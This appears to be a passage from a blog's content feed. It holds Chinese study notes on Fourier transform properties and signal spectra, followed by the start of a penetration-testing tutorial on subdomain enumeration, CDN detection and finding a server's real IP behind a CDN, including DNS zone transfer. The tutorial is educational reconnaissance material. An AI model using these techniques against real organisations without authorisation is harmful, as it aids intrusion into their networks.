title="激冲函数"></a>激冲函数</h3><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221002164857492.png" alt="image-20221002164857492"></p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221002164923662.png" alt="image-20221002164923662" style="zoom: 50%;" /><h3 id="常数1"><a href="#常数1" class="headerlink" title="常数1"></a>常数1</h3><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221003103204963.png" alt="image-20221003103204963" style="zoom:50%;" /><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221002165004749.png" alt="image-20221002165004749"></p><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221002165023247.png" alt="image-20221002165023247"></p><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221002165042291.png" alt="image-20221002165042291"></p><h3 id="符号函数"><a href="#符号函数" class="headerlink" title="符号函数"></a>符号函数</h3><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221002165130771.png" alt="image-20221002165130771"></p><h3 id="阶跃函数"><a href="#阶跃函数" class="headerlink" title="阶跃函数"></a>阶跃函数</h3><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221002165151722.png" alt="image-20221002165151722"></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221002165212664.png" alt="image-20221002165212664"></p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221002165233481.png" alt="image-20221002165233481" style="zoom:50%;" /><h1 id="傅里叶变换的性质1"><a href="#傅里叶变换的性质1" class="headerlink" title="傅里叶变换的性质1"></a>傅里叶变换的性质1</h1><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221003121128398.png" alt="image-20221003121128398"></p><p><strong>意义</strong>：傅里叶变换具有唯一性。傅里叶变换的性质揭示了信号的时域特性和频域特性之间的内在联系。讨论傅里叶变换的性质，目的在于:了解时-频域特性的内在联系;利用性质方便求解$F(j\omega)$;了解在通信系统领域中的应用。</p><p><strong>说明</strong>:( 1)这些性质是建立在变化对的基础上;( 2）常见变换+性质可以解决较复杂的问题。</p><h2 id="线性性质"><a href="#线性性质" class="headerlink" title="线性性质"></a>线性性质</h2><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221003121533897.png" alt="image-20221003121533897" style="zoom:50%;" /><h3 id="例1"><a href="#例1" class="headerlink" title="例1"></a>例1</h3><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221003121638539.png" alt="image-20221003121638539" style="zoom:50%;" /><h3 id="例2"><a href="#例2" class="headerlink" title="例2"></a>例2</h3><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221003121924720.png" alt="image-20221003121924720"></p><h2 id="奇偶性"><a href="#奇偶性" class="headerlink" title="奇偶性"></a>奇偶性</h2><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221003121805935.png" alt="image-20221003121805935" style="zoom:50%;" /><h3 id="f-x-为实函数"><a href="#f-x-为实函数" class="headerlink" title="$f(x)$为实函数"></a>$f(x)$为实函数</h3><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221003121957989.png" alt="image-20221003121957989"></p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221003130134540.png" alt="image-20221003130134540" style="zoom: 67%;" /><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221003122035776.png" alt="image-20221003122035776"></p><h4 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h4><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221003122325375.png" alt="image-20221003122325375" style="zoom:50%;" /><h3 id="f-x-为虚函数-f-t-jg-t"><a href="#f-x-为虚函数-f-t-jg-t" class="headerlink" title="$f(x)$为虚函数$f(t)=jg(t)$"></a>$f(x)$为虚函数$f(t)=jg(t)$</h3><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221003122053855.png" alt="image-20221003122053855"></p><h2 id="对称性-1"><a href="#对称性-1" class="headerlink" title="对称性"></a>对称性</h2><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221003122458266.png" alt="image-20221003122458266"></p><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221003122547264.png" alt="image-20221003122547264"></p><h3 id="例1-1"><a href="#例1-1" class="headerlink" title="例1"></a>例1</h3><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221003122712842.png" alt="image-20221003122712842"></p><h3 id="例3"><a href="#例3" class="headerlink" title="例3"></a>例3</h3><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221003122739364.png" alt="image-20221003122739364"></p><h2 id="尺度变换特性"><a href="#尺度变换特性" class="headerlink" title="尺度变换特性"></a>尺度变换特性</h2><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221003122841087.png" alt="image-20221003122841087"></p><h3 id="0-lt-a-lt-1时域扩展，频带压缩"><a href="#0-lt-a-lt-1时域扩展，频带压缩" class="headerlink" title="0&lt;a&lt;1时域扩展，频带压缩"></a>0&lt;a&lt;1时域扩展，频带压缩</h3><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221003122937891.png" alt="image-20221003122937891"></p><p><strong>0&lt;a&lt;1，脉冲持续时间增加a倍，变化慢了，信号在频域的频带压缩a倍。高频分量减少，幅度上升a倍。</strong></p><h3 id="a-gt-1时域压缩，频带扩展"><a href="#a-gt-1时域压缩，频带扩展" class="headerlink" title="a&gt;1时域压缩，频带扩展"></a>a&gt;1时域压缩，频带扩展</h3><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221003123226200.png" alt="image-20221003123226200"></p><p><strong>a&gt;1，脉冲持续持续时间短，变化快了。信号在频域高频分量增加，频带展宽，各分量的幅度下降a倍。</strong></p><h2 id="Delta-时移特性"><a href="#Delta-时移特性" class="headerlink" title="$\Delta$时移特性"></a>$\Delta$时移特性</h2><p><font color="red">原函数延迟一个量或超前一个量的变换。非常重要！<strong>线代通信理论的基础</strong>。</font></p><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221003123403128.png" alt="image-20221003123403128"></p><h3 id="例1-2"><a href="#例1-2" class="headerlink" title="例1"></a>例1</h3><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221003123450036.png" alt="image-20221003123450036" style="zoom: 67%;" /><h3 id="例2-1"><a href="#例2-1" class="headerlink" title="例2"></a>例2</h3><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221003123546865.png" alt="image-20221003123546865"></p><h3 id="例3-1"><a href="#例3-1" class="headerlink" title="例3"></a>例3</h3><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221003123605091.png" alt="image-20221003123605091"></p><h2 id="Delta-频移特性"><a href="#Delta-频移特性" class="headerlink" title="$\Delta$频移特性"></a>$\Delta$频移特性</h2><p><font color="red">通信原理中，<strong>调制解调的基础</strong>。信号为什么能发出去？<strong>频谱搬移</strong></font></p><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221003123847459.png" alt="image-20221003123847459"></p><h3 id="例2（背结果）"><a href="#例2（背结果）" class="headerlink" title="例2（背结果）"></a>例2（背结果）</h3><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221003124109687.png" alt="image-20221003124109687"></p><h3 id="例4"><a href="#例4" class="headerlink" title="例4"></a>例4</h3><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221003124848336.png" alt="image-20221003124848336" style="zoom:50%;" /><p>说的一句话信号为$f(t)$，信号直接乘$cos\omega_{0}t$就相当于把它的频谱搬到$f(t)cos(\omega_{0}t)$上，双边谱调制发出去。</p><p>$cos\omega_{0}t$为载波信号，相当于汽车，将$f(t)$载着运到一个地方去，已调信号发射出去（发到收音机）。</p><p>收音机收到后，要将信号解出来就需要解调。再乘$cos\omega_{0}t$得到音频信号。</p><h2 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h2><p>$1.线性：若f_{1}(t)\leftrightarrow F_{2}(j\omega),f_{2}(t)\leftrightarrow F_{2}(j\omega)，则af_{1}(t)+bf_{2}(t)\leftrightarrow aF_{1}(j\omega)+bF_{2}(j\omega)$</p><p>$2.奇偶性：若f(t)\leftrightarrow F(j\omega)，则f(-t)\leftrightarrow F(-j\omega)$</p><p>$3.对称性：若f(t)\leftrightarrow F(j\omega)，则F(jt)\leftrightarrow 2\pi f(-\omega)$</p><p>$4.尺度变换特征：若f(t)\leftrightarrow F(\omega)，则f(at)\leftrightarrow \frac{1}{|a|}F(j\frac{\omega}{a})，a为非零实数$</p><p>$5.时移特性：若f(t)\leftrightarrow F(j\omega)，则f(t\pm t_{0})\leftrightarrow e^{\pm ja\omega_{0}}F(j\omega)，t_{0}为实常数。\若F(j\omega)=|F(j\omega)|e^{j\varphi(\omega)}，则f(t\pm t_{0})\leftrightarrow|F(j\omega)|·e^{j[\varphi(\omega)\pm\omega t_{0}]}$</p><p>$6.频移特性：若f(t)\leftrightarrow F(j\omega)，则e^{\textcolor{red}{\mp }j\omega_{0}t}f(t)\leftrightarrow F[j(\omega\textcolor{red}{\pm }\omega_{0})]，\omega_{0}为实常数。$</p><h1 id="傅里叶变换的性质2"><a href="#傅里叶变换的性质2" class="headerlink" title="傅里叶变换的性质2"></a>傅里叶变换的性质2</h1><h2 id="Delta-卷积定理"><a href="#Delta-卷积定理" class="headerlink" title="$\Delta$卷积定理"></a>$\Delta$卷积定理</h2><img src="C:/Users/zhangguozhi/AppData/Roaming/Typora/typora-user-images/image-20221004164913587.png" alt="image-20221004164913587" style="zoom:50%;" /><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221004165600826.png" alt="image-20221004165600826" style="zoom:50%;" /><h3 id="例1-3"><a href="#例1-3" class="headerlink" title="例1"></a>例1</h3><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221004165748615.png" alt="image-20221004165748615" style="zoom:50%;" /><h3 id="Delta-例2"><a href="#Delta-例2" class="headerlink" title="$\Delta$例2"></a>$\Delta$例2</h3><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221004170846860.png" alt="image-20221004170846860" style="zoom:50%;" /><p><font color="red">没听懂调频……4.22卷积定理</font></p><p>   调频比调幅好，失真小。调频：频率随着要传出的信息变化。同步解调</p><h2 id="时域微积分特性"><a href="#时域微积分特性" class="headerlink" title="时域微积分特性"></a>时域微积分特性</h2><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221004185117186.png" alt="image-20221004185117186" style="zoom:50%;" /><h3 id="例1-4"><a href="#例1-4" class="headerlink" title="例1"></a>例1</h3><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221004185209270.png" alt="image-20221004185209270" style="zoom:50%;" /><h3 id="推论1"><a href="#推论1" class="headerlink" title="推论1"></a>推论1</h3><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221004185332465.png" alt="image-20221004185332465" style="zoom:50%;" /><h3 id="推论2"><a href="#推论2" class="headerlink" title="推论2"></a>推论2</h3><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221004185416193.png" alt="image-20221004185416193" style="zoom:50%;" /><h2 id="频域微积分性质"><a href="#频域微积分性质" class="headerlink" title="频域微积分性质"></a>频域微积分性质</h2><p><strong>解决频域求得n阶导数对应时间函数和原函数关系问题</strong></p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221004185512894.png" alt="image-20221004185512894" style="zoom:50%;" /><h3 id="例2-2"><a href="#例2-2" class="headerlink" title="例2"></a>例2</h3><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221004185538386.png" alt="image-20221004185538386" style="zoom:50%;" /><h2 id="相关原理"><a href="#相关原理" class="headerlink" title="相关原理"></a>相关原理</h2><p>$1.互相关函数\rightarrow f_{1}和f_{2}不相同$</p><p>$时域相关运算：R_{12}(\tau)=\int_{-\infty}^{+\infty}f_{1}(\tau)f_{2}(t-\tau)dt=f_{1}(t)*f_{2}(-\tau)\qquad时域的卷积=频域的乘法运算$</p><p>$若f_{1}(t)\leftrightarrow F_{1}(j\omega)，f_{2}(t)\leftrightarrow F_{2}(j\omega)$</p><p>$则F[R_{12}(\tau)]\leftrightarrow F_{1}(j\omega)F_{2}^{<em>}(j\omega)，F[R_{21}(\tau)]\leftrightarrow F_{1}^{</em>}(j\omega)F_{2}(j\omega)$</p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221004191420810.png" alt="image-20221004191420810" style="zoom:50%;" /><p>$所以R_{12}(\tau)\leftarrow F_{1}(j\omega)F_{2}^{*}(j\omega)$</p><p>$2.自相关函数\rightarrow f_{1}和f_{2}为相同的f$<br>$$<br>F[R(\tau)]=F(j\omega)F^{*}(j\omega)=|F(j\omega)|^{2}<br>$$</p><h1 id="能量谱和功率谱"><a href="#能量谱和功率谱" class="headerlink" title="能量谱和功率谱"></a>能量谱和功率谱</h1><p><strong>$\Delta$ 在随机信号分析中很重要！</strong></p><h2 id="能量谱"><a href="#能量谱" class="headerlink" title="能量谱"></a>能量谱</h2><h3 id="信号能量"><a href="#信号能量" class="headerlink" title="信号能量"></a>信号能量</h3><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221004193259060.png" alt="image-20221004193259060" style="zoom:50%;" /><h3 id="Delta-帕斯瓦尔能量方程"><a href="#Delta-帕斯瓦尔能量方程" class="headerlink" title="$\Delta$帕斯瓦尔能量方程"></a>$\Delta$帕斯瓦尔能量方程</h3><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221004193356821.png" alt="image-20221004193356821" style="zoom:50%;" /><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221007175622856.png" alt="image-20221007175622856" style="zoom: 67%;" /><h3 id="能量密度谱-E-omega"><a href="#能量密度谱-E-omega" class="headerlink" title="能量密度谱$E(\omega)$"></a>能量密度谱$E(\omega)$</h3><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221004193606756.png" alt="image-20221004193606756" style="zoom:50%;" /><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221004195532002.png" alt="image-20221004195532002" style="zoom:50%;" />$$总结：\\&E=\int^{+\infty}_{-\infty}|f(t)|^{2}dt = \int^{+\infty}_{-\infty}|F(j\omega)|^{2}d\omega\qquad时域不好求可以通过频域求能量\\&R(\tau)\leftrightarrow|F(j\omega)|^{2}=E(\omega)$$<h3 id="例1-5"><a href="#例1-5" class="headerlink" title="例1"></a>例1</h3><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221004201447232.png" alt="image-20221004201447232" style="zoom:50%;" /><h2 id="功率谱"><a href="#功率谱" class="headerlink" title="功率谱"></a>功率谱</h2><h3 id="信号功率"><a href="#信号功率" class="headerlink" title="信号功率"></a>信号功率</h3><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221004201718253.png" alt="image-20221004201718253" style="zoom:50%;" /><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221004201814779.png" alt="image-20221004201814779" style="zoom:50%;" /><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221004201855823.png" alt="image-20221004201855823" style="zoom:50%;" /><h3 id="功率密度谱"><a href="#功率密度谱" class="headerlink" title="功率密度谱"></a>功率密度谱</h3><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221004202025610.png" style="zoom:50%;" /><h3 id="功率密度谱与自相关函数的关系"><a href="#功率密度谱与自相关函数的关系" class="headerlink" title="功率密度谱与自相关函数的关系"></a>功率密度谱与自相关函数的关系</h3><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221004202154688.png" alt="image-20221004202154688" style="zoom:50%;" /><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221004202232073.png" alt="image-20221004202232073" style="zoom:50%;" /><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221007180351425.png" alt="image-20221007180351425" style="zoom:67%;" /><h4 id="例1-6"><a href="#例1-6" class="headerlink" title="例1"></a>例1</h4><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221007180613295.png" alt="image-20221007180613295" style="zoom:67%;" /><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221007180539851.png" alt="image-20221007180539851" style="zoom:67%;" /><h4 id="总结-3"><a href="#总结-3" class="headerlink" title="总结"></a>总结</h4><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221004202304032.png" alt="image-20221004202304032"></p><h3 id="白噪声功率谱密度"><a href="#白噪声功率谱密度" class="headerlink" title="白噪声功率谱密度"></a>白噪声功率谱密度</h3><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221004202545862.png" alt="image-20221004202545862" style="zoom:50%;" /><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221004202509159.png" alt="image-20221004202509159" style="zoom:50%;" /><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221004202622138.png" alt="image-20221004202622138" style="zoom:50%;" /><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221004202648880.png" alt="image-20221004202648880" style="zoom:50%;" /><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221004202707832.png" alt="image-20221004202707832" style="zoom:50%;" /><h2 id="能量谱和功率谱的关系"><a href="#能量谱和功率谱的关系" class="headerlink" title="能量谱和功率谱的关系"></a>能量谱和功率谱的关系</h2><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221007180738067.png" alt="image-20221007180738067" style="zoom:67%;" /><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221007180909408.png" alt="image-20221007180909408" style="zoom: 67%;" /><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221007180948511.png" alt="image-20221007180948511" style="zoom: 67%;" /><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221007181111580.png" alt="image-20221007181111580"></p><h1 id="周期信号的傅里叶变换"><a href="#周期信号的傅里叶变换" class="headerlink" title="周期信号的傅里叶变换"></a>周期信号的傅里叶变换</h1><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221005172634170.png" alt="image-20221005172634170" style="zoom:50%;" /><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221005173237686.png" alt="image-20221005173237686" style="zoom:50%;" /><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221007181341762.png" alt="image-20221007181341762"></p><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221007181406192.png" alt="image-20221007181406192"></p><p>结论：1.周期信号可以求出傅里叶变换，2.是$\delta函数：冲激序列$</p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221005173756760.png" alt="image-20221005173756760" style="zoom:50%;" /><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221007164937335.png" alt="image-20221007164937335" style="zoom:50%;" /><h2 id="例1-7"><a href="#例1-7" class="headerlink" title="例1"></a>例1</h2><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221007172634617.png" alt="image-20221007172634617" style="zoom:50%;" /><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221007172543799.png" alt="image-20221007172543799" style="zoom:50%;" /><p><strong>结论：$\delta序列出来的还是一个\delta序列$</strong></p><h2 id="例2-3"><a href="#例2-3" class="headerlink" title="例2"></a>例2</h2><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221007173027620.png" alt="image-20221007173027620" style="zoom:50%;" /><h2 id="级数和变换的关系"><a href="#级数和变换的关系" class="headerlink" title="级数和变换的关系"></a>级数和变换的关系</h2><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221007173220040.png" alt="image-20221007173220040" style="zoom:50%;" /><h2 id="总结-4"><a href="#总结-4" class="headerlink" title="总结"></a>总结</h2><ul><li>公式1：周期信号展开成傅里叶级数从而求得系数，再通过系数由级数求出傅里叶变换</li><li>公式2：把一个周期信号理解成一个基本信号，将整个周期信号理解成一个基本信号和$\delta$序列的卷积。从而，根据时域的卷积等于频域的乘法运算。</li></ul><h1 id="总结-5"><a href="#总结-5" class="headerlink" title="总结"></a>总结</h1>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 通信原理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>子域名深度挖掘</title>
      <link href="/2022/10/30/%E5%AD%90%E5%9F%9F%E5%90%8D%E6%B7%B1%E5%BA%A6%E6%8C%96%E6%8E%98/"/>
      <url>/2022/10/30/%E5%AD%90%E5%9F%9F%E5%90%8D%E6%B7%B1%E5%BA%A6%E6%8C%96%E6%8E%98/</url>
      
        <content type="html"><![CDATA[<h2 id="子域名深度挖掘"><a href="#子域名深度挖掘" class="headerlink" title="子域名深度挖掘"></a>子域名深度挖掘</h2><p>[TOC]</p><h3 id="前言"><a href="#前言" class="headerlink" title="前言:"></a>前言:</h3><p>企业可能有多个、几十个甚至很多的子域名应用，因为子域名数量多，企业在人员和防护的投入可能会没有主站及时。攻击者在主域名找不到突破口时，就可以进行子域名的信息收集，然后通过子域名的漏洞进行迂回。</p><p><del>例如:<a href="http://www.qfnu.edu.cn主域不存在漏洞,并且防护措施严密,而二级域名/">www.qfnu.edu.cn主域不存在漏洞，并且防护措施严密，而二级域名</a> jsj.qfnu.edu.cn存在漏洞，防护措施松散，可以采用迂回战术拿下子域名，然后逐步靠近主域。</del></p><blockquote><p style="color:orange;">目的：核心目标久攻不下，从侧面展开攻击并逐步获取核心目标权限</p></blockquote><h3 id="一、前置知识"><a href="#一、前置知识" class="headerlink" title="一、前置知识"></a>一、前置知识</h3><h4 id="1-1-域名类别"><a href="#1-1-域名类别" class="headerlink" title="1.1 域名类别"></a>1.1 域名类别</h4><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/10/30/子域名深度挖掘/域名分类.png" alt="" style="zoom:50%;" /><center>1-1 域名分类</center>#### 1.2 子域名<p>子域名是在域名系统等级中属于更高一层域的域。比如：jsj.qfnu.edu.cn和da.qfnu.edu.cn是qfnu.edu.cn的两个子域。</p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/10/30/子域名深度挖掘/攻击阶段列举.png" style="zoom:80%;" /><center>1-2 渗透测试阶段举例</center>在网络攻防的过程中，信息收集是非常重要的一步， 通过信息收集可以了解渗透目标的网络架构，描述出相关 的网络拓扑，缩小攻击范围。只有将目标的相关信息收集 完整，才可以对攻击目标开启的主机及主机安装运行的应 用，针对性的进行有效攻击。我们要讲的内容子域名深度挖掘实际上只是其中一部分，还有像whois域名注册信息查询，网站后台(敏感/备份文件&目录)扫描，whois查询和反查/IP查询和反查/C段查询， Email信息收集， WEB指纹识别&WEB后台扫描等众多的内容<p>为了保证网络的稳定网站服务商会在网络的不同位置设置节点服务器，通过 CDN技术，将网络请求分发到最优的节点服务器上面。</p><h4 id="1-3-CDN判断与绕过"><a href="#1-3-CDN判断与绕过" class="headerlink" title="1.3 CDN判断与绕过"></a>1.3 CDN判断与绕过</h4><p>当CDN技术成熟时，不只是正常用户部署有CDN，比如服务器部署正国外的<del>不法网站</del>往往会采用国内的CDN，使国内用户访问。</p><blockquote><p style="color:red;">站长工具：http://ping.chinaz.com/</p><p style="color:red;">爱站网：https://ping.aizhan.com/</p><p style="color:red;">国外 ping 探测：https://asm.ca.com/en/ping.php</p></blockquote><p>利用站长工具对<a href="http://www.baidu.com多地探测返回的结果,发现有多达15个不同的ip,www.baidu.com同时有显示cdn提供商为百度云加速,这个应该算理所当然,百度没cdn才属于离谱./">www.baidu.com多地探测返回的结果，发现有多达15个不同的IP,www.baidu.com同时有显示CDN提供商为百度云加速，这个应该算理所当然，百度没CDN才属于离谱。</a></p><h5 id="nslookup域名解析"><a href="#nslookup域名解析" class="headerlink" title="nslookup域名解析"></a>nslookup域名解析</h5><p>通过系统自带的【nslookup】命令对域名解析, 发现有【39.156.66.18】和【39.156.66.14】两个 不同的IP,说明【<a href="http://www.baidu.com】可能使用了cdn./">www.baidu.com】可能使用了CDN。</a></p><h5 id="有CDN例子"><a href="#有CDN例子" class="headerlink" title="有CDN例子"></a>有CDN例子</h5><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment"># www.abc.com</span><span class="token comment"># 服务器:public1.114dns.com</span><span class="token comment"># Address: 114.114.114.114 </span>非权威应答：<span class="token comment"># 名称:abc.xdwscache.ourglb0.com</span><span class="token comment"># Addresses: 58.223.164.86 125.75.32.252</span><span class="token comment"># Aliases: www.abc.com</span><span class="token comment"># www.abc.com.lxdns.com</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="无CDN例子"><a href="#无CDN例子" class="headerlink" title="无CDN例子"></a>无CDN例子</h5><pre class="line-numbers language-php" data-language="php"><code class="language-php">abc<span class="token operator">.</span>com服务器<span class="token punctuation">:</span>public1<span class="token operator">.</span><span class="token number">114</span>dns<span class="token operator">.</span>comAddress<span class="token punctuation">:</span> <span class="token number">114.114</span><span class="token number">.114</span><span class="token number">.114</span>非权威应答：名称<span class="token punctuation">:</span>abc<span class="token operator">.</span>comAddress<span class="token punctuation">:</span> <span class="token number">192.12</span><span class="token number">.168</span><span class="token number">.172</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="1-4-绕过CDN获取真实IP"><a href="#1-4-绕过CDN获取真实IP" class="headerlink" title="1.4 绕过CDN获取真实IP"></a>1.4 绕过CDN获取真实IP</h4><h5 id="查询子域名"><a href="#查询子域名" class="headerlink" title="查询子域名"></a>查询子域名</h5><blockquote><p style="color:skyblue;">子域名可能跟主站在同一个服务 器或者同一个C段网络中，可以通过子 域名探测的方式，收集目标的子域名 信息,通过查询子域名的IP信息来辅助 判断主站的真实IP信息。</p></blockquote><p>作用：IP/域名-&gt;同网段下的IP<br>通过IP或域名可以查询同网段的不同IP ，查询手段：webscan或其他工具   <a href="https://www.webscan.cc/">https://www.webscan.cc/</a></p><h5 id="使用国外主机解析域名"><a href="#使用国外主机解析域名" class="headerlink" title="使用国外主机解析域名"></a>使用国外主机解析域名</h5><p>探测的方式也有两种，一种是利用 自己已有的境外的主机直接进行探测, 另一种如果没有国外主机可以利用公开的多地ping服务，多地ping服务有国外的探测节点，可以利用国外节点的返回信息来判断真实的IP信息。</p><h5 id="网站漏洞"><a href="#网站漏洞" class="headerlink" title="网站漏洞"></a>网站漏洞</h5><p>利用网站存在的漏洞，信息泄露的敏感信息、文件，如phpinfo文件、网站源码文件、Github泄露的信息等都可能会将真实的IP信息泄露。</p><p>邮件的信息中会记录邮件服务器的IP信息，有些站点有类似于RSS邮件订阅可以发送邮件的功能，可以利用其发送的邮件，通过查看源码的方式查看真实服务器的IP信息。</p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/10/30/子域名深度挖掘/获取子域名的方式.png" style="zoom:67%;" /><center><p>1-3  获取子域名的方式</p></center>### 二、挖掘工具<h4 id="2-1子域名挖掘手段"><a href="#2-1子域名挖掘手段" class="headerlink" title="2.1子域名挖掘手段"></a>2.1子域名挖掘手段</h4><ul><li>DNS域传送漏洞发现子域名（这个漏洞比较早现在已经有很少应用）</li><li>搜索引擎发现子域名</li><li>证书透明性信息发现子域名</li><li>第三方聚合服务发现子域名</li><li>子域名枚举发现子域名</li></ul><h4 id="2-2-DNS域传送"><a href="#2-2-DNS域传送" class="headerlink" title="2.2 DNS域传送"></a>2.2 DNS域传送</h4><p>作为重要的互联网基础设施，难免成为黑客的重点攻击目标，服务的稳定性尤为重要。DNS服务器分为：主服务器、备份服务器和缓存服务器。在主备服务器之间同步数据库，需要使用“DNS域传送”。域传送是指后备服务器从主服务器拷贝数据，并用得到的数据更新自身数据库<br>若DNS服务器配置不当，可能导致匿名用户获取某个域的所有记录。造成整个网络的拓扑结构泄露给潜在的攻击者，包括一些安全性较低的内部主机，如测试服务器。凭借这份网络蓝图，攻击者可以节省很少的扫描时间。<br>大的互联网厂商通常将内部网络与外部互联网隔离开，一个重要的手段是使用Private DNS。如果内部DNS泄露，将造成极大的安全风险。风险控制不当甚至造成整个内部1网络沦陷。<br>当然这个漏洞非常鸡肋，只有大公司会用Private DNS服务器，但是一个古老漏洞，会出现问题的可能性不大。</p><h4 id="2-3-搜索引擎发现子域名"><a href="#2-3-搜索引擎发现子域名" class="headerlink" title="2.3 搜索引擎发现子域名"></a>2.3 搜索引擎发现子域名</h4><blockquote><p 